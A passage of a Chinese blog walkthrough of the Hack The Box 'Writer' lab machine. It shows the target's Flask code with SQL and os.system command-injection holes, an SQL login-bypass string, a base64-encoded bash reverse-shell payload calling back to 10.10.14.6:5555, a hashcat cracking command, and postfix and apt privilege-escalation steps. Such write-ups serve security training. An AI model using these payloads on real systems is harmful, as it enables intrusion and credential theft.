class="hljs-string">&#x27;image_url&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image_url:<br>                <span class="hljs-keyword">try</span>:<br>                    local_filename, headers = urllib.request.urlretrieve(image_url)<br>                    os.system(<span class="hljs-string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename, local_filename))<br>                    image = <span class="hljs-string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename)<br>                    <span class="hljs-keyword">try</span>:<br>                        im = Image.<span class="hljs-built_in">open</span>(image) <br>                        im.verify()<br>                        im.close()<br>                        image = image.replace(<span class="hljs-string">&#x27;/tmp/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                        os.system(<span class="hljs-string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image, image))<br>                        image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image)<br>                    <span class="hljs-keyword">except</span> PIL.UnidentifiedImageError:<br>                        os.system(<span class="hljs-string">&quot;rm &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image))<br>                        error = <span class="hljs-string">&quot;Not a valid image file!&quot;</span><br>                        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br>                <span class="hljs-keyword">except</span>:<br>                    error = <span class="hljs-string">&quot;Issue uploading picture&quot;</span><br>                    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br>        author = request.form.get(<span class="hljs-string">&#x27;author&#x27;</span>)<br>        title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>        tagline = request.form.get(<span class="hljs-string">&#x27;tagline&#x27;</span>)<br>        content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,&#x27;Published&#x27;,now(),%(image)s);&quot;</span>, &#123;<span class="hljs-string">&#x27;author&#x27;</span>:author,<span class="hljs-string">&#x27;title&#x27;</span>: title,<span class="hljs-string">&#x27;tagline&#x27;</span>: tagline,<span class="hljs-string">&#x27;content&#x27;</span>: content, <span class="hljs-string">&#x27;image&#x27;</span>:image &#125;)<br>        result = connector.commit()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard/stories&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories/edit/&lt;id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_story</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        results = cursor.fetchall()<br>        <span class="hljs-keyword">if</span> request.files[<span class="hljs-string">&#x27;image&#x27;</span>]:<br>            image = request.files[<span class="hljs-string">&#x27;image&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image.filename:<br>                path = os.path.join(<span class="hljs-string">&#x27;/var/www/writer.htb/writer/static/img/&#x27;</span>, image.filename)<br>                image.save(path)<br>                image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image.filename)<br>                cursor = connector.cursor()<br>                cursor.execute(<span class="hljs-string">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span>, &#123;<span class="hljs-string">&#x27;image&#x27;</span>:image, <span class="hljs-string">&#x27;id&#x27;</span>:<span class="hljs-built_in">id</span>&#125;)<br>                result = connector.commit()<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>        <span class="hljs-keyword">if</span> request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>):<br>            image_url = request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image_url:<br>                <span class="hljs-keyword">try</span>:<br>                    local_filename, headers = urllib.request.urlretrieve(image_url)<br>                    os.system(<span class="hljs-string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename, local_filename))<br>                    image = <span class="hljs-string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename)<br>                    <span class="hljs-keyword">try</span>:<br>                        im = Image.<span class="hljs-built_in">open</span>(image) <br>                        im.verify()<br>                        im.close()<br>                        image = image.replace(<span class="hljs-string">&#x27;/tmp/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                        os.system(<span class="hljs-string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image, image))<br>                        image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image)<br>                        cursor = connector.cursor()<br>                        cursor.execute(<span class="hljs-string">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span>, &#123;<span class="hljs-string">&#x27;image&#x27;</span>:image, <span class="hljs-string">&#x27;id&#x27;</span>:<span class="hljs-built_in">id</span>&#125;)<br>                        result = connector.commit()<br><br>                    <span class="hljs-keyword">except</span> PIL.UnidentifiedImageError:<br>                        os.system(<span class="hljs-string">&quot;rm &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image))<br>                        error = <span class="hljs-string">&quot;Not a valid image file!&quot;</span><br>                        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    error = <span class="hljs-string">&quot;Issue uploading picture&quot;</span><br>                    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>        title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>        tagline = request.form.get(<span class="hljs-string">&#x27;tagline&#x27;</span>)<br>        content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s&quot;</span>, &#123;<span class="hljs-string">&#x27;title&#x27;</span>:title, <span class="hljs-string">&#x27;tagline&#x27;</span>:tagline, <span class="hljs-string">&#x27;content&#x27;</span>:content, <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        result = connector.commit()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard/stories&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        results = cursor.fetchall()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories/delete/&lt;id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_story</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;DELETE FROM stories WHERE id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        result = connector.commit()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard/stories&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        results = cursor.fetchall()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;delete.html&#x27;</span>, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">#Define user page for dashboard</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/users&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">users</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Database Error&quot;</span><br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM users;&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;users.html&#x27;</span>, results=results)<br><br><span class="hljs-comment">#Define settings page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/settings&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">settings</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Database Error!&quot;</span><br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM site WHERE id = 1&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;settings.html&#x27;</span>, results=results)<br><br><span class="hljs-comment">#Define authentication mechanism</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/administrative&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login_page</span>():</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;uname&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        password = hashlib.md5(password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>        <span class="hljs-keyword">try</span>:<br>            connector = connections()<br>        <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            cursor = connector.cursor()<br>            sql_command = <span class="hljs-string">&quot;Select * From users Where username = &#x27;%s&#x27; And password = &#x27;%s&#x27;&quot;</span> % (username, password)<br>            cursor.execute(sql_command)<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got result&quot;</span>)<br>            <span class="hljs-keyword">if</span> result <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(result) != <span class="hljs-number">0</span>:<br>                session[<span class="hljs-string">&#x27;user&#x27;</span>] = username<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;success.html&#x27;</span>, results=results)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;Incorrect credentials supplied&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=error)<br>        <span class="hljs-keyword">except</span>:<br>            error = <span class="hljs-string">&quot;Incorrect credentials supplied&quot;</span><br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=error)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    session.pop(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>   app.run(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></div></td></tr></table></figure>
+<p>接口@app.route(‘/dashboard/stories/add’, methods=[‘GET’, ‘POST’])存在一个命令注入漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>):<br>            image_url = request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image_url:<br>                <span class="hljs-keyword">try</span>:<br>                    local_filename, headers = urllib.request.urlretrieve(image_url)<br>                    os.system(<span class="hljs-string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename, local_filename))<br>                    image = <span class="hljs-string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename)<br>                    <span class="hljs-keyword">try</span>:<br>                        im = Image.<span class="hljs-built_in">open</span>(image) <br>                        im.verify()<br>                        im.close()<br>                        image = image.replace(<span class="hljs-string">&#x27;/tmp/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                        os.system(<span class="hljs-string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image, image))<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>可以在image_url后面拼接命令反弹shell。要进入这个接口，需要我们先进入系统后台，由于存在SQL注入漏洞，可以直接使用万能密码登录后台。<br>admin’ or ‘1’=’1</p>
+<p><img src="/images/pasted-8.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>进入后台后，在添加文章页面，注入命令反弹shell。注意这个URLlib这里想进行命令拼接注入，URL路径只能是服务端本地的路径，否则无法执行命令。</p>
+<p>通过本地文件上传功能上传一个反弹shell的文件名</p>
+<p><img src="/images/pasted-11.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p><img src="/images/pasted-12.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>通过URL参数读取拼接命令注入的文件名，拿到shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">file:///var/www/writer.htb/writer/static/img/01.jpg;`<span class="hljs-built_in">echo</span> YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNi81NTU1IDwmMSc= | base64 -d | bash`<br></code></pre></div></td></tr></table></figure>
+
+
+<p><img src="/images/pasted-13.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p><img src="/images/pasted-14.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>查看mysql数据库配置文件</p>
+<p><img src="/images/pasted-17.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>将mysql的端口转发出来</p>
+<p><img src="/images/pasted-18.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>连接数据库查看数据</p>
+<p><img src="/images/pasted-20.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -a 0 -m 10000 pass.txt --wordlist /usr/share/wordlists/rockyou.txt<br></code></pre></div></td></tr></table></figure>
+<p>破解密码</p>
+<p><img src="/images/pasted-21.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>拿到密码之后，ssh到kyle用户</p>
+<p><img src="/images/pasted-23.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看本地监听端口</p>
+<p><img src="/images/pasted-25.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>端口转发</p>
+<p><img src="/images/pasted-26.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>nmap扫描判断服务和版本</p>
+<p><img src="/images/pasted-27.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>查看kyle用户信息</p>
+<p><img src="/images/pasted-28.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>查看filter组拥有的文件权限</p>
+<p><img src="/images/pasted-29.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>可通过向postfix邮箱的配置文件当中写命令来完成反弹shell，反弹shell的用户是收到邮件的用户。</p>
+<p>写shell命令</p>
+<p><img src="/images/pasted-31.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>发送邮件</p>
+<p><img src="/images/pasted-32.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>获得shell</p>
+<p><img src="/images/pasted-33.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>读取.ssh私钥信息</p>
+<p><img src="/images/pasted-34.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>通过ssh私钥连接</p>
+<p><img src="/images/pasted-35.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>查看本地进程，有apt服务，且以root运行</p>
+<p><img src="/images/pasted-36.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>用户john权限信息</p>
+<p><img src="/images/pasted-37.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>查看apt配置文件目录的权限信息</p>
+<p><img src="/images/pasted-38.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>通过修改apt的配置文件，反弹shell提权到root</p>
+<p><img src="/images/pasted-40.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>反弹shell</p>
+<p><img src="/images/pasted-41.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://rustlang.rs/post/htb-writer/">https://rustlang.rs/post/htb-writer/</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-smtp">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></li>
+<li><a target="_blank" rel="noopener" href="https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish">https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish</a></li>
+<li><a target="_blank" rel="noopener" href="https://mobt3ath.com/uplode/books/book-27297.pdf">https://mobt3ath.com/uplode/books/book-27297.pdf</a></li>
+<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/apt-get/">https://gtfobins.github.io/gtfobins/apt-get/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></li>
+</ul>
+<h2 id="总结学习"><a href="#总结学习" class="headerlink" title="总结学习"></a>总结学习</h2><ul>
+<li>apache其中之一默认配置文件路径 /etc/apache2/sites-enabled/000-default.conf</li>
+<li>sqlmap 联合注入读取文件</li>
+<li>python package结构</li>
+<li>python os system命令注入</li>
+<li>mysql服务配置文件 /etc/mysql/my.cnf</li>
+<li>john、hashcat 破解密码 rockyou字典</li>
+<li>/etc/postfix/disclaimer 配置文件getshell</li>
+<li>apt 配置文件getshell</li>
+<li>用户组权限、进程、端口</li>
+<li>信息收集、信息收集、信息收集</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/HTB/">HTB</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/03/HTB-Previse%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB-Previse通关记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js" ></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({"theme":"default"});
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
